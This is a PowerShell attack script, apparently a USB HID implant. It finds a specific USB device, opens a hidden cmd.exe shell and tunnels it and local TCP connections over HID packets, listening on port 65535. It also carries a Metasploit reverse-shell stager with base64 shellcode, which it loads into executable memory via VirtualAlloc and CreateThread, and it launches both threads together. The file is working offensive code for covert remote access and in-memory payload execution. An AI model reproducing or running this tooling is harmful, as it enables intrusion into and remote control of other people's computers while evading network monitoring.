if ($M -eq $null) {
	$M = 64
	$cs = '
	using System;
	using System.IO;
	using Microsoft.Win32.SafeHandles;
	using System.Runtime.InteropServices;
	namespace n {
		public class w {
			[DllImport(%kernel32.dll%, CharSet = CharSet.Auto, SetLastError = true)]
			public static extern SafeFileHandle CreateFile(String fn, UInt32 da, Int32 sm, IntPtr sa, Int32 cd, uint fa, IntPtr tf);
			[DllImport(%user32.dll%)]
			public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
			[DllImport(%user32.dll%)]
			public static extern IntPtr SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int x, int Y, int cx, int cy, int wFlags);

			public static FileStream o(string fn) {
				return new FileStream(CreateFile(fn, 0XC0000000U, 3, IntPtr.Zero, 3, 0x40000000, IntPtr.Zero), FileAccess.ReadWrite, 9, true);
			}
		}
	}
	'.Replace('%',[char]34)
	Add-Type -TypeDefinition $cs
	try {
		$devs = gwmi Win32_USBControllerDevice
		foreach ($dev in $devs) {
			$wmidev = [wmi]$dev.Dependent
			if ($wmidev.GetPropertyValue('DeviceID') -match ('1209&PID_6667') -and ($wmidev.GetPropertyValue('Service') -eq $null)) {
				$fn = ([char]92+[char]92+'?'+[char]92 + $wmidev.GetPropertyValue('DeviceID').ToString().Replace([char]92,[char]35) + [char]35+'{4d1e55b2-f16f-11cf-88cb-001111000030}')
			}
		}
		$f = [n.w]::o($fn)
		# $f = (New-Object Net.Sockets.TcpClient("192.168.48.1", 65535)).GetStream()
	} catch {
		echo $_.Exception|format-list -force
		$ErrorMessage = $_.Exception.Message
		$FailedItem = $_.Exception.ItemName
		[System.Console]::WriteLine("Exception caught, terminating main loop")
		[System.Console]::WriteLine($ErrorMessage)
		[System.Console]::WriteLine($FailedItem)
	}
}

$Proxy = {
	Param($M, $Device)

	$SYN=1
	$ACK=2
	$FIN=4
	$RST=8

	function spawn($filename, $arguments) {
		$p = New-Object -TypeName System.Diagnostics.Process
		$i = $p.StartInfo
		$i.CreateNoWindow = $true
		$i.UseShellExecute = $false
		$i.RedirectStandardInput = $true
		$i.RedirectStandardOutput = $true
		$i.RedirectStandardError = $true
		$i.FileName = $filename
		$i.Arguments = $arguments
		$null = $p.Start()
		return $p
	}

	function bs($v, $n) { [math]::floor($v * [math]::pow(2, $n)) }
	function sa($s,$a) { (bs ($s -band 15) 4) -bor ($a -band 15)}
	function seq($b) { (bs $b -4) -band 15 }
	function ack($b) { $b -band 15 }

	function MakeHIDPacket($tcb, $flag, $data, $length) {
		if ($length -eq $null) {
			$length = 0
		} elseif ($length -lt 0 -or $length -gt ($M-4)) {
			$length = 0
			[System.Console]::WriteLine("Length out of range: " + $length)
			exit
		}
		if ((($flag -band $SYN) -eq $SYN) -or (($flag -band $FIN) -eq $FIN) -or $length -gt 0) {
			$tcb.SendSeq++
		}
		$b = @(0, $tcb.Channel, $flag, (sa $tcb.SendSeq $tcb.Ack))
		$b += $length
		[System.Console]::WriteLine("Sending: " + $b)

		for ($i=0; $i -lt $length; $i++) {
			$b += $data[$i]
		}
		for ($i=$length; $i -lt ($M-4); $i++) {
			$b += 0
		}
		if ($b.Length -ne ($M+1)) {
			[System.Console]::WriteLine("Invalid length: " + $b.Length)
		}
		return $b
	}

	function MakeTCB($channel, $ReadStream, $WriteStream) {
		return @{
			Channel = $channel
			ReadStream = $ReadStream
			WriteStream = $WriteStream
			StreamReadBuff = New-Object Byte[] ($M-4)
			SendSeq = 3
			SendUnack = 3
			Ack = 0
			RecNxt = 0
			DeviceWriteQueue = @{}
		}
	}

	function debugPacket($prefix, $tcb, $packet) {
		if ($tcb -eq $null) {
			$u = ""
		} else {
			$u = $tcb.SendUnack
		}
		[System.Console]::WriteLine([string]::Format($prefix + "Channel: {0} Flags={1} Seq={2} Ack={3} Length={4} (SendUnack={5})", $packet[1], $packet[2], (seq $packet[3]), (ack $packet[3]), $packet[4], $u))
	}

	function WriteDevice($tcb, $packet) {
		debugPacket "S: " $tcb $packet
		$device.Write($packet, 0, ($M+1))
	}

	function ReadSocket($tcb) {
		if ($tcb.StreamReadTask -ne $null -and $tcb.StreamReadTask.IsCompleted
		  #-and (($tcb.SendSeq - $tcb.SendUnack) -band 15) -lt 7
			) {
			$l = $tcb.ReadStream.EndRead($tcb.StreamReadTask)
			[System.Console]::WriteLine("ReadSocket got " + $l)

			if ($l -gt 0) {
				WriteDevice $tcb (MakeHIDPacket $tcb $ACK $tcb.StreamReadBuff $l)
				$tcb.StreamReadTask = $tcb.ReadStream.BeginRead($tcb.StreamReadBuff, 0, ($M-4), $null, $null)
			} else {
				WriteDevice $tcb (MakeHIDPacket $tcb $FIN $null 0)
				$tcb.StreamReadTask = $null
			}
		}
	}

	function ProcessAck($tcb, $packet) {
		$a = ($tcb.SendUnack+1) -band 15
		[System.Console]::WriteLine("ProcessAck: TCB SendUnack=" + $tcb.SendUnack + " SendSeq=" + $tcb.SendSeq)
		[System.Console]::WriteLine("ProcessAck: channel " + $tcb.Channel + " " + $a + ":" + (ack $packet[3]))
		if (ack $packet[3] -eq (($tcb.SendUnack+1) -band 15)) {
			$tcb.SendUnack = ack $packet[3]
		}
	}

	function OpenChannel($channel, $ReadStream, $WriteStream) {
		$tcb = MakeTCB $channel $ReadStream $WriteStream
		[System.Console]::WriteLine("Using TCB channel " + $tcb.Channel)
		$packet = MakeHIDPacket $tcb $SYN $null 0
		WriteDevice $tcb $packet
		return $tcb
	}

	function CleanupTCB($tcb) {
		[System.Console]::WriteLine("Cleanup TCB")

		if ($tcb.ReadStream -ne $null) {
			try {
				$tcb.ReadStream.Close()
				$tcb.ReadStream.Dispose()
				$tcb.StreamReadTask = $null
				$tcb.ReadStream = $null

				$tcb.WriteStream.Close()
				$tcb.WriteStream.Dispose()
				$tcb.WriteStream = $null
			} catch {
				echo $_.Exception|format-list -force
			}
		}
	}

	try {
		[System.Console]::WriteLine("Entering proxy thread")
		$conns=New-Object HashTable[] 256

		# Spawn a command prompt on channel 1
		$cmd = spawn "cmd.exe" "/c cmd.exe /k 2>&1 "
		$conns[1] = OpenChannel 1 $cmd.StandardOutput.BaseStream $cmd.StandardInput.BaseStream

		$TcpListener = New-Object Net.Sockets.TcpListener([Net.IPAddress]::Any, 65535)
		$TcpListener.Start()
		$ListenerTask = $TcpListener.BeginAcceptTcpClient($null, $null)

		$DeviceBuff = New-Object Byte[] ($M+1)

		[System.Console]::WriteLine("Entering proxy loop")
		while ($true) {
			if ($DeviceReadTask -eq $null) {
				$DeviceReadTask = $Device.BeginRead($DeviceBuff, 0, ($M+1), $null, $null)
			}
			if ($DeviceReadTask -ne $null -and $DeviceReadTask.IsCompleted) {
				$l = $Device.EndRead($DeviceReadTask)
				$DeviceReadTask = $null
				debugPacket "R: " $tcb $DeviceBuff
				if ($l -ne ($M+1)) {
					[System.Console]::WriteLine("Error reading from device, got " + $l + " bytes")
					$TcpListener.Stop()
					exit
				}

				$channel = $DeviceBuff[1+0]
				$tcb = $conns[$channel]
				$flag = $DeviceBuff[1+1]
				if ($flag -eq $SYN) {
					# incoming from the other side of the HID, not supported yet
					$tcb = MakeTCB $channel $null $null
					$Device.Write((MakeHIDPacket $tcb $RST $null 0), 0, ($M+1))
					CleanupTCB $tcb
				} elseif ($tcb -ne $null -band ($flag -eq $FIN -or $flag -eq $RST )) {
					[System.Console]::WriteLine("Flag: " + $flag)
					$Device.Write((MakeHIDPacket $tcb ($flag -bor $ACK) $null 0), 0, ($M+1))
					CleanupTCB $tcb
				} elseif (($flag -band $ACK) -eq $ACK) {
					if ($tcb -ne $null) {
						ProcessAck $tcb $DeviceBuff
						$response = $false
						$l = 0
						$data = $null
						if (($flag -band $SYN) -eq $SYN) { # If we get a SYN/ACK, we can start reading from the socket
							$tcb.Ack = ((seq $DeviceBuff[1+2]) + 1) -band 15
							$tcb.StreamReadTask = $tcb.ReadStream.BeginRead($tcb.StreamReadBuff, 0, ($M-4), $null, $null)
							$response = $true
							$flag = $ACK
						} elseif (($flag -band $FIN) -eq $FIN) {
							$conns[$channel] = $null
							CleanupTCB $tcb
						} else {
							if ($tcb.StreamReadTask -ne $null -and $tcb.StreamReadTask.IsCompleted) {
								$l = $tcb.ReadStream.EndRead($tcb.StreamReadTask)
								if ($l -gt 0) {
									$data = $tcb.StreamReadBuff + 0
									$tcb.StreamReadTask = $tcb.ReadStream.BeginRead($tcb.StreamReadBuff, 0, ($M-4), $null, $null)
									$flag = $ACK
								} else {
									$tcb.StreamReadTask = $null
									$flag = $FIN
								}
								$response = $true
							}
							if ((seq $DeviceBuff[1+2]) -eq $tcb.Ack -and $DeviceBuff[1+3] -gt 0) {
								$tcb.Ack = ($tcb.Ack+1) -band 15
								try {
									$tcb.WriteStream.Write($DeviceBuff, 1+4, $DeviceBuff[1+3])
									$tcb.WriteStream.Flush()
								} catch {
									$Device.Write((MakeHIDPacket $tcb $RST $null 0), 0, ($M+1))
									CleanupTCB $tcb
									continue
								}
								$response = $true
							}
						}
						if ($response -eq $true) {
							WriteDevice $tcb (MakeHIDPacket $tcb $flag $data $l)
						}
					} else {
						[System.Console]::WriteLine("Bad ACK on channel with no TCB: " + $channel)
					}
				}
				$DeviceReadTask = $Device.BeginRead($DeviceBuff, 0, ($M+1), $null, $null)
				continue
			}

			if ($ListenerTask -ne $null -and $ListenerTask.IsCompleted) {
				[System.Console]::WriteLine("Connection received")
				$channel = $null
				for ($c=2; $c -lt 255; $c++) {
					if ($conns[$c] -eq $null) {
						$channel = $c
						break
					}
				}
				[System.Console]::WriteLine("Connect will use channel: " + $channel)
				$client = $TcpListener.EndAcceptTcpClient($ListenerTask)
				if ($channel -eq $null) {
					[System.Console]::WriteLine("No channels available")
					$client.Close()
				} else {
					$tcb = OpenChannel $channel $client.GetStream() $client.GetStream()
					$conns[$channel] = $tcb
				}
				$ListenerTask = $TcpListener.BeginAcceptTcpClient($null, $null)
				continue
			}
			for ($c=1;$c -lt 256;$c++) {
				if ($conns[$c] -ne $null) {
					ReadSocket $conns[$c]
				}
			}
			if ($loop++ -eq 1000) {
				$loop=0
				Start-Sleep -m 1
			}
#			[System.Console]::Write(".")
		}
	} catch {
		echo $_.Exception|format-list -force
		$ErrorMessage = $_.Exception.Message
		$FailedItem = $_.Exception.ItemName
		[System.Console]::WriteLine("Exception caught, terminating main loop")
		[System.Console]::WriteLine($ErrorMessage)
		[System.Console]::WriteLine($FailedItem)
	}

	[System.Console]::Write("Proxy thread completed")

	$device.Close()
	$socket.Close()
	exit
}

# Uncomment this to only run the proxy, without triggering metasploit
& $Proxy $M $f

#================== Thread 2 code: the meterpreter stager ==================
$MeterpreterStager = {
	[System.Console]::WriteLine("Meterpreter thread started")
	# If this stager is used, pay attention to call this script from the 32 bits version of powershell: C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe
	# Generated using: msfvenom -p windows/shell/reverse_tcp -f psh-reflection LHOST=127.0.0.1 LPORT=65535
	function ogz2 {
		Param ($x3Vs, $nkS7QSA)
		$shlUOd4 = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

		return $shlUOd4.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($shlUOd4.GetMethod('GetModuleHandle')).Invoke($null, @($x3Vs)))), $nkS7QSA))
	}

	function jsf8RUi4D {
		Param (
			[Parameter(Position = 0, Mandatory = $True)] [Type[]] $eUj0vp6,
			[Parameter(Position = 1)] [Type] $uXCOGO = [Void]
		)

		$uKcu45F_ = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
		$uKcu45F_.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $eUj0vp6).SetImplementationFlags('Runtime, Managed')
		$uKcu45F_.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $uXCOGO, $eUj0vp6).SetImplementationFlags('Runtime, Managed')

		return $uKcu45F_.CreateType()
	}

	[Byte[]]$vjavcb5X2 = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEAACnEVFBoKYBrAP/VagVofwAAAWgCAP//ieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04IdezoYQAAAGoAagRWV2gC2chf/9WD+AB+Nos2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1YP4AH0iWGgAQAAAagBQaAsvDzD/1VdodW5NYf/VXl7/DCTpcf///wHDKcZ1x8O78LWiVmoAU//V")

	$vUUS = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((ogz2 kernel32.dll VirtualAlloc), (jsf8RUi4D @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $vjavcb5X2.Length,0x3000, 0x40)
	[System.Runtime.InteropServices.Marshal]::Copy($vjavcb5X2, 0, $vUUS, $vjavcb5X2.length)

	$z4da = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((ogz2 kernel32.dll CreateThread), (jsf8RUi4D @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$vUUS,[IntPtr]::Zero,0,[IntPtr]::Zero)
	[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((ogz2 kernel32.dll WaitForSingleObject), (jsf8RUi4D @([IntPtr], [Int32]))).Invoke($z4da,0xffffffff) | Out-Null
}

#================= Launch both threads =================
$proxyThread = [PowerShell]::Create()
[void] $proxyThread.AddScript($Proxy)
[void] $proxyThread.AddParameter("M", $M)
[void] $proxyThread.AddParameter("device", $f)

$meterpreterThread = [PowerShell]::Create()
[void] $meterpreterThread.AddScript($MeterpreterStager)
[System.IAsyncResult]$AsyncProxyJobResult = $null
[System.IAsyncResult]$AsyncMeterpreterJobResult = $null

try {
	Write-Host "About to start proxy thread"
	$AsyncProxyJobResult = $proxyThread.BeginInvoke()

	Sleep 2 # Wait 2 seconds to give some time for the proxy to be ready
	$AsyncMeterpreterJobResult = $meterpreterThread.BeginInvoke()
}
catch {
	$ErrorMessage = $_.Exception.Message
	Write-Host $ErrorMessage
}
finally {
	if ($meterpreterThread -ne $null -and $AsyncMeterpreterJobResult -ne $null) {
		$meterpreterThread.EndInvoke($AsyncMeterpreterJobResult)
		$meterpreterThread.Dispose()
	}

	if ($proxyThread -ne $null -and $AsyncProxyJobResult -ne $null) {
		$proxyThread.EndInvoke($AsyncProxyJobResult)
		$proxyThread.Dispose()
		exit
	}
}
